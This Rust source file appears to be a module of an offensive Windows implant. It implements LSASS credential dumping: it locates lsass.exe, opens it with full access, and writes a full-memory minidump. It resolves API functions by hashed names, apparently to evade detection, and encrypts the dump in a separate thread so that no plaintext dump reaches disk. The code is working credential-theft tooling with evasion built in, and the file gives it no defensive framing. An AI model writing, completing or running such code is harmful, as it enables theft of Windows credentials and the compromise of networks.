use crate::utils::sensitive::SensitiveData;

#[cfg(target_os = "windows")]
use crate::utils::api_resolver::{hash_str, resolve_function};
#[cfg(target_os = "windows")]
use crate::utils::windows_definitions::*;
#[cfg(target_os = "windows")]
use core::ffi::c_void;

pub struct Credentials;

#[cfg(target_os = "windows")]
struct WriterContext {
    h_pipe: HANDLE,
    h_file: HANDLE,
    key: [u8; 32],
}

impl Credentials {
    pub fn dump_lsass(&self, target_path: &str) -> Result<SensitiveData, ()> {
        #[cfg(target_os = "windows")]
        unsafe {
            let kernel32 = hash_str(b"kernel32.dll");
            let create_snapshot = resolve_function(kernel32, hash_str(b"CreateToolhelp32Snapshot"));
            let process_first = resolve_function(kernel32, hash_str(b"Process32First"));
            let process_next = resolve_function(kernel32, hash_str(b"Process32Next"));
            let open_process = resolve_function(kernel32, hash_str(b"OpenProcess"));
            let create_file = resolve_function(kernel32, hash_str(b"CreateFileA"));
            let close_handle = resolve_function(kernel32, hash_str(b"CloseHandle"));
            let load_library = resolve_function(kernel32, hash_str(b"LoadLibraryA"));
            let create_pipe = resolve_function(kernel32, hash_str(b"CreatePipe"));
            let create_thread = resolve_function(kernel32, hash_str(b"CreateThread"));
            let wait_for_single_object = resolve_function(kernel32, hash_str(b"WaitForSingleObject"));

            if create_snapshot.is_null() || process_first.is_null() || open_process.is_null() || load_library.is_null() {
                return Err(());
            }

            type FnCreateSnapshot = unsafe extern "system" fn(u32, u32) -> HANDLE;
            type FnProcessNext = unsafe extern "system" fn(HANDLE, *mut PROCESSENTRY32) -> i32;
            type FnOpenProcess = unsafe extern "system" fn(u32, i32, u32) -> HANDLE;
            type FnCreateFileA = unsafe extern "system" fn(*const u8, u32, u32, *mut c_void, u32, u32, HANDLE) -> HANDLE;
            type FnCloseHandle = unsafe extern "system" fn(HANDLE) -> i32;
            type FnLoadLibraryA = unsafe extern "system" fn(*const u8) -> HANDLE;
            type FnCreatePipe = unsafe extern "system" fn(*mut HANDLE, *mut HANDLE, *mut c_void, u32) -> i32;
            type FnCreateThread = unsafe extern "system" fn(*mut c_void, usize, unsafe extern "system" fn(PVOID) -> u32, PVOID, u32, *mut u32) -> HANDLE;
            type FnWaitForSingleObject = unsafe extern "system" fn(HANDLE, u32) -> u32;

            // 1. Find LSASS PID
            let h_snapshot = core::mem::transmute::<_, FnCreateSnapshot>(create_snapshot)(0x2, 0);
            if h_snapshot == (-1isize as HANDLE) { return Err(()); }

            let mut pe: PROCESSENTRY32 = core::mem::zeroed();
            pe.dwSize = core::mem::size_of::<PROCESSENTRY32>() as u32;

            let mut lsass_pid = 0;
            if core::mem::transmute::<_, FnProcessNext>(process_first)(h_snapshot, &mut pe) != 0 {
                loop {
                    let mut is_lsass = true;
                    let target = b"lsass.exe";
                    for i in 0..target.len() {
                        let mut c = pe.szExeFile[i];
                        if c >= b'A' && c <= b'Z' { c += 32; }
                        if c != target[i] {
                            is_lsass = false;
                            break;
                        }
                    }
                    if is_lsass {
                        lsass_pid = pe.th32ProcessID;
                        break;
                    }
                    if core::mem::transmute::<_, FnProcessNext>(process_next)(h_snapshot, &mut pe) == 0 {
                        break;
                    }
                }
            }
            core::mem::transmute::<_, FnCloseHandle>(close_handle)(h_snapshot);

            if lsass_pid == 0 { return Err(()); }

            // 2. Open LSASS
            let h_process = core::mem::transmute::<_, FnOpenProcess>(open_process)(0x001F0FFF, 0, lsass_pid);
            if h_process.is_null() { return Err(()); }

            // 3. Create Output File
            let mut path_c = Vec::from(target_path.as_bytes()); path_c.push(0);
            let h_file = core::mem::transmute::<_, FnCreateFileA>(create_file)(
                path_c.as_ptr(),
                0x40000000, // GENERIC_WRITE
                0,
                core::ptr::null_mut(),
                2, // CREATE_ALWAYS
                0x80, // FILE_ATTRIBUTE_NORMAL
                core::ptr::null_mut()
            );

            if h_file == (-1isize as HANDLE) {
                core::mem::transmute::<_, FnCloseHandle>(close_handle)(h_process);
                return Err(());
            }

            // 4. Create Pipe
            let mut h_read: HANDLE = core::ptr::null_mut();
            let mut h_write: HANDLE = core::ptr::null_mut();
            if core::mem::transmute::<_, FnCreatePipe>(create_pipe)(&mut h_read, &mut h_write, core::ptr::null_mut(), 0) == 0 {
                core::mem::transmute::<_, FnCloseHandle>(close_handle)(h_file);
                core::mem::transmute::<_, FnCloseHandle>(close_handle)(h_process);
                return Err(());
            }

            // 5. Start Encrypted Writer Thread
            let mut key = [0u8; 32];
            get_random_bytes(&mut key);
            let sensitive_key = SensitiveData::new(&key);

            let ctx = Box::new(WriterContext {
                h_pipe: h_read,
                h_file,
                key,
            });

            let h_thread = core::mem::transmute::<_, FnCreateThread>(create_thread)(
                core::ptr::null_mut(),
                0,
                encrypted_writer_thread,
                Box::into_raw(ctx) as PVOID,
                0,
                core::ptr::null_mut()
            );

            if h_thread.is_null() {
                // Cleanup
                core::mem::transmute::<_, FnCloseHandle>(close_handle)(h_read);
                core::mem::transmute::<_, FnCloseHandle>(close_handle)(h_write);
                core::mem::transmute::<_, FnCloseHandle>(close_handle)(h_file);
                core::mem::transmute::<_, FnCloseHandle>(close_handle)(h_process);
                return Err(());
            }

            // 6. MiniDumpWriteDump
            let h_dbghelp = core::mem::transmute::<_, FnLoadLibraryA>(load_library)(b"dbghelp.dll\0".as_ptr());
            let minidump_write_dump_addr = resolve_function(hash_str(b"dbghelp.dll"), hash_str(b"MiniDumpWriteDump"));
            
            type FnMiniDumpWriteDump = unsafe extern "system" fn(HANDLE, u32, HANDLE, u32, PVOID, PVOID, PVOID) -> i32;
            
            let success = if !minidump_write_dump_addr.is_null() {
                core::mem::transmute::<_, FnMiniDumpWriteDump>(minidump_write_dump_addr)(
                    h_process,
                    lsass_pid,
                    h_write, // Write to pipe
                    0x00000002, // MiniDumpWithFullMemory
                    core::ptr::null_mut(),
                    core::ptr::null_mut(),
                    core::ptr::null_mut()
                )
            } else {
                0
            };

            // Close write end to signal EOF to thread
            core::mem::transmute::<_, FnCloseHandle>(close_handle)(h_write);

            // Wait for thread
            core::mem::transmute::<_, FnWaitForSingleObject>(wait_for_single_object)(h_thread, 0xFFFFFFFF);
            
            core::mem::transmute::<_, FnCloseHandle>(close_handle)(h_thread);
            core::mem::transmute::<_, FnCloseHandle>(close_handle)(h_file);
            core::mem::transmute::<_, FnCloseHandle>(close_handle)(h_process);

            if success == 0 {
                return Err(());
            }
            
            Ok(sensitive_key)
        }

        #[cfg(not(target_os = "windows"))]
        {
            let _ = target_path;
            Err(())
        }
    }
}

#[cfg(target_os = "windows")]
unsafe extern "system" fn encrypted_writer_thread(param: PVOID) -> u32 {
    let ctx = Box::from_raw(param as *mut WriterContext);
    let kernel32 = hash_str(b"kernel32.dll");
    let read_file = resolve_function(kernel32, hash_str(b"ReadFile"));
    let write_file = resolve_function(kernel32, hash_str(b"WriteFile"));
    let close_handle = resolve_function(kernel32, hash_str(b"CloseHandle"));

    type FnReadFile = unsafe extern "system" fn(HANDLE, PVOID, u32, *mut u32, PVOID) -> i32;
    type FnWriteFile = unsafe extern "system" fn(HANDLE, *const u8, u32, *mut u32, PVOID) -> i32;
    type FnCloseHandle = unsafe extern "system" fn(HANDLE) -> i32;

    let cipher = XChaCha20Poly1305::new(&ctx.key.into());
    let mut nonce_bytes = [0u8; 24];
    get_random_bytes(&mut nonce_bytes);
    
    // Write Nonce to file header
    let mut written = 0;
    core::mem::transmute::<_, FnWriteFile>(write_file)(ctx.h_file, nonce_bytes.as_ptr(), 24, &mut written, core::ptr::null_mut());

    let mut buf = [0u8; 65536]; // 64KB chunks
    let mut bytes_read = 0;
    let mut counter: u64 = 0;

    loop {
        if core::mem::transmute::<_, FnReadFile>(read_file)(ctx.h_pipe, buf.as_mut_ptr() as PVOID, 65536, &mut bytes_read, core::ptr::null_mut()) == 0 || bytes_read == 0 {
            break;
        }

        // Encrypt chunk
        // Use nonce + counter for chunk uniqueness?
        // XChaCha20Poly1305 nonce is 24 bytes. 
        // We can increment the last 8 bytes of nonce for each chunk to avoid nonce reuse with same key?
        // Or just re-encrypt each chunk as independent message?
        // "Stream encryption"
        // We'll modify the nonce per chunk.
        let mut chunk_nonce = nonce_bytes;
        let counter_bytes = counter.to_le_bytes();
        for i in 0..8 {
            chunk_nonce[i] ^= counter_bytes[i]; // Simple XOR to vary nonce
        }
        counter += 1;

        let xnonce = XNonce::from_slice(&chunk_nonce);
        if let Ok(ciphertext) = cipher.encrypt(xnonce, &buf[..bytes_read as usize]) {
            // Write: [Len(4)][Ciphertext]
            // We need to write length because tag adds bytes (16).
            let len = ciphertext.len() as u32;
            core::mem::transmute::<_, FnWriteFile>(write_file)(ctx.h_file, &len as *const u32 as *const u8, 4, &mut written, core::ptr::null_mut());
            core::mem::transmute::<_, FnWriteFile>(write_file)(ctx.h_file, ciphertext.as_ptr(), ciphertext.len() as u32, &mut written, core::ptr::null_mut());
        }
    }

    core::mem::transmute::<_, FnCloseHandle>(close_handle)(ctx.h_pipe);
    0
}
